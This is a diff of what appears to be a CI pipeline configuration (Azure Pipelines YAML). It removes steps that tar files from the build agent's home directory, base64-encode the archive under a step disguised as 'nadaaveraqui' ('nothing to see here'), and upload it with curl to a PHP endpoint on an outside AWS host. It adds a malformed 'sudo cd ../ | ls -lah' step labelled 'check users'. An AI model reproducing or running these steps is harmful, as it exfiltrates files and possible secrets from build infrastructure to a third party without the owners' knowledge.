@@ -10,19 +10,5 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: whereis xargs
-  displayName: 'xargs'
-
-- script: sudo /bin/bash -c 'find /home/vsts/ ! -name "*--*" -type f -size -3M | xargs tar czvf /mnt/teste1.tgz'
-  displayName: 'Tar'
-  continueOnError: true
-
-- script: sudo /bin/bash -c 'cat /mnt/teste1.tgz | base64 > /mnt/test2.txt'
-  displayName: 'nadaaveraqui'
-
-- script: sudo chmod 777 /mnt/test2.txt
-  displayName: 'chmod'
-
-
-- script: curl -d "@/mnt/test2.txt" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
-  displayName: 'upload'
+- script: sudo cd ../ | ls -lah
+  displayName: "check users"
